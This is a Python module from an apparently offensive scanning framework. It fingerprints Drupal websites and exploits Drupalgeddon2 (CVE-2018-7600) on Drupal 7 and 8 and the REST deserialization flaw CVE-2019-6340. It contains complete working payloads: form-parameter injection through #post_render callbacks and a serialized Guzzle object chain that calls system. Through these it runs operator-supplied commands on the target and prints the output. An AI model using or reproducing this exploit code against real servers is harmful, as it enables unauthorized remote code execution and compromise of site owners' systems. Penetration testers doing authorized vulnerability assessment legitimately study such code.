import os.path
import re
import json
from urllib.parse import urljoin
from urllib.parse import quote_plus

from utils.output import Output
from utils.db import DB
from utils.utils import gen_random_string, gen_bruteforce_creds
from lib.httpscan.http import HTTP

# source: https://www.ambionics.io/blog/drupal8-rce
# Source: https://gist.github.com/leonjza/d0ab053be9b06fa020b66f00358e3d88/f9f6a5bb6605745e292bee3a4079f261d891738a

drupal_version_pattern = re.compile("Drupal (\\d+)")

class Module:
    name = 'Drupal'
    description = 'Discover and exploit drupal (CVE-2018-7600, CVE-2019-6340)'

    def run(self, target, args, useragent, proxy, timeout, safe):
        http = HTTP(target['method'], target['hostname'], target['port'], useragent, proxy, timeout)

        Output.minor({'target': http.url(target['path']), 'message': '[%s] Running module...' % self.name})

        res = http.get(target['path'])

        if res and res["code"] in [200] and "drupal" in res["html"].lower():
            Output.write({'target': http.url(target['path']), 'message': '[%s] Website using Drupal discovered' % self.name})

            http_info = {
                'hostname': target['hostname'],
                'port': target['port'],
                'protocol': 'tcp',
                'service': 'http',
                'url': http.url(os.path.join(target['path'])),
                'http': {
                    'path': os.path.join(target['path']),
                    'code': res['code'],
                    'server': res['server'],
                    'title': res['title'],
                    'content-type': res['content-type'],
                },
                'tags': ['drupal']
            }
            DB.insert_http_url(http_info)

            match = drupal_version_pattern.search(res['html'])
            if not match:
                return

            drupal_version = int(match.group(1))

            if drupal_version == 8:
                # Check CVE-2018-7600 (for Drupal 8)

                random_str = gen_random_string()
                exploit_url = os.path.join(target['path'], 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax')
                printf_payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'printf', 'mail[#type]': 'markup', 'mail[#markup]': random_str}

                res = http.post(exploit_url, printf_payload)
                if res != None and res["code"] in [200] and random_str in res["html"]:
                    Output.vuln({'target': http.url(target['path']), 'message': '[%s] Vulnerable to Drupalgeddon2 RCE (CVE-2018-7600)' % self.name})

                    vuln_info = {
                        'hostname': target['hostname'],
                        'port': target['port'],
                        'service': 'http',
                        'url': http.url(target['path']),
                        'name': 'Drupalgeddon2 RCE (CVE-2018-7600)',
                        'description': 'Server %s vulnerable to Drupal RCE (CVE-2018-7600)' % http.url(target['path']),
                    }
                    DB.insert_vulnerability(vuln_info)

                    if args['exec']:
                        exec_payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': args['exec']}
                        res = http.post(exploit_url, exec_payload)
                        try:
                            res = json.loads(res['html'])
                            Output.highlight({'target': http.url(target['path']), 'message': '[%s] RCE exploitation output:\n%s' % (self.name, res[0]['data'])})
                        except:
                            Output.highlight({'target': http.url(target['path']), 'message': '[%s] Execution error' % self.name})

                # Check CVE-2019-6340

                # A usable node must be found first
                for i in range(1, 1000):
                    node_url = os.path.join(target['path'], 'node/%d' % i)
                    output = http.get(node_url)

                    if not output['code'] in [200]:
                        continue

                    if 'X-Drupal-Cache' in output['headers'] and output['headers']['X-Drupal-Cache'] == 'HIT':
                        # Page in cache, skip
                        continue

                    # Ok we got a usable node

                    random_str = gen_random_string()
                    exploit_url = os.path.join(target['path'], 'node/%d?_format=hal_json' % i)
                    if args['exec']:
                        cmd = 'echo %s & %s' % (random_str, args['exec'])
                    else:
                        cmd = 'echo %s' % random_str
                    payload_url = http.url(os.path.join(target['path'], 'rest/type/shortcut/default'))
                    payload = {
                        "link": [
                            {
                                "value": "link",
                                "options": "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\u0000"
                                           "GuzzleHttp\\Psr7\\FnStream\u0000methods\";a:1:{s:5:\""
                                           "close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":3:"
                                           "{s:32:\"\u0000GuzzleHttp\\HandlerStack\u0000handler\";"
                                           "s:|size|:\"|command|\";s:30:\"\u0000GuzzleHttp\\HandlerStack\u0000"
                                           "stack\";a:1:{i:0;a:1:{i:0;s:6:\"system\";}}s:31:\"\u0000"
                                           "GuzzleHttp\\HandlerStack\u0000cached\";b:0;}i:1;s:7:\""
                                           "resolve\";}}s:9:\"_fn_close\";a:2:{i:0;r:4;i:1;s:7:\"resolve\";}}"
                                           "".replace('|size|', str(len(cmd))).replace('|command|', cmd)
                            }
                        ],
                        "_links": {
                            "type": {
                                "href": payload_url,
                            }
                        }
                    }
                    res = http.get(exploit_url, data=json.dumps(payload), headers={"Content-Type": "application/hal+json"})

                    if 'X-Drupal-Cache' in res['headers'] and res['headers']['X-Drupal-Cache'] == 'HIT':
                        # Page in cache, may have failed
                        continue

                    if res != None and res["code"] in [200] and random_str in res["html"]:
                        Output.vuln({'target': http.url(target['path']), 'message': '[%s] Vulnerable to RCE (CVE-2019-6340)' % self.name})

                        vuln_info = {
                            'hostname': target['hostname'],
                            'port': target['port'],
                            'service': 'http',
                            'url': http.url(target['path']),
                            'name': 'Drupal RCE (CVE-2019-6340)',
                            'description': 'Server %s vulnerable to Drupal RCE (CVE-2019-6340)' % http.url(target['path']),
                        }
                        DB.insert_vulnerability(vuln_info)

                        if args['exec']:
                            Output.highlight({'target': http.url(target['path']), 'message': '[%s] RCE exploitation output:\n%s' % (self.name, res['html'].split(random_str)[-1])})

                    break


            elif drupal_version == 7:
                # Check CVE-2018-7600 (for Drupal 7)
                random_str = gen_random_string()
                exploit_url = os.path.join(target['path'], "?q=user/password&name%5b%23post_render%5d%5b%5d=printf&name%5b%23type%5d=markup&name%5b%23markup%5d=" + random_str)
                payload = {'form_id': 'user_pass', '_triggering_element_name': 'name'}

                res = http.post(exploit_url, payload)
                if res == None or not res["code"] in [200]:
                    return

                p = re.compile('input type="hidden" name="form_build_id" value="(.*)"')
                m = p.search(res["html"])

                if m == None:
                    return

                res_url = os.path.join(target['path'], "?q=file/ajax/name/%23value/" + m.group(1))
                res_payload = {'form_build_id': m.group(1)}

                res = http.post(res_url, res_payload)
                if res != None and res["code"] in [200] and random_str in res["html"]:
                    Output.vuln({'target': http.url(target['path']), 'message': '[%s] Vulnerable to Drupalgeddon2 RCE (CVE-2018-7600)' % self.name})

                    vuln_info = {
                        'hostname': target['hostname'],
                        'port': target['port'],
                        'service': 'http',
                        'url': http.url(target['path']),
                        'name': 'Drupalgeddon2 RCE (CVE-2018-7600)',
                        'description': 'Server %s vulnerable to Drupal RCE (CVE-2018-7600)' % http.url(target['path']),
                    }
                    DB.insert_vulnerability(vuln_info)

                    if args['exec']:
                        exec_url = os.path.join(target['url'], "?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=" + quote_plus(args['exec']))
                        res = http.post(exec_url, payload)

                        if res == None or not res["code"] in [200]:
                            return

                        p = re.compile('input type="hidden" name="form_build_id" value="(.*)"')
                        m = p.search(res["html"])

                        if m == None:
                            return

                        res_url = os.path.join(target['path'], "?q=file/ajax/name/%23value/" + m.group(1))
                        res_payload = {'form_build_id': m.group(1)}

                        res = http.post(res_url, res_payload)

                        res = res["html"]
                        res = "[".join(res.split('[')[:-1])
                        Output.highlight({'target': http.url(target['path']), 'message': '[%s] RCE exploitation output:\n%s' % (self.name, res)})
